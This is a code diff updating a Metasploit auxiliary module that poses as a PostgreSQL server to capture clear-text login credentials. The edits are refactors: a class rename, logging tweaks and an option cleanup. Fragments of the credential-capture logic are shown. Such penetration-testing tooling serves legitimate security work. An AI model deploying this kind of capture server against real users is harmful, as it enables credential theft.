@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::TcpServer
   include Msf::Auxiliary::Report
 
@@ -18,7 +15,7 @@ class Metasploit3 < Msf::Auxiliary
         capture clear-text authentication credentials.},
       'Author'         => 'Dhiru Kholia <dhiru[at]openwall.com>',
       'License'        => MSF_LICENSE,
-      'Actions'        => [ [ 'Capture' ] ],
+      'Actions'        => [[ 'Capture', 'Description' => 'Run PostgreSQL capture server' ]],
       'PassiveActions' => [ 'Capture' ],
       'DefaultAction'  => 'Capture'
     )
@@ -26,7 +23,7 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         OptPort.new('SRVPORT', [ true, "The local port to listen on.", 5432 ]),
-      ], self.class)
+      ])
   end
 
   # This module is based on MySQL capture module by Patrik Karlsson.
@@ -38,7 +35,6 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run
-    print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
     exploit()
   end
 
@@ -108,7 +104,7 @@ class Metasploit3 < Msf::Auxiliary
         password: @state[c][:password],
         proof: @state[c][:database]
       )
-      print_status("PostgreSQL LOGIN #{@state[c][:name]} #{@state[c][:username]} / #{@state[c][:password]} / #{@state[c][:database]}")
+      print_good("PostgreSQL LOGIN #{@state[c][:name]} #{@state[c][:username]} / #{@state[c][:password]} / #{@state[c][:database]}")
       # send failure message
       sdata = [ 0x45, 97 - 8 + @state[c][:username].length].pack("CN")
       sdata << "SFATAL"
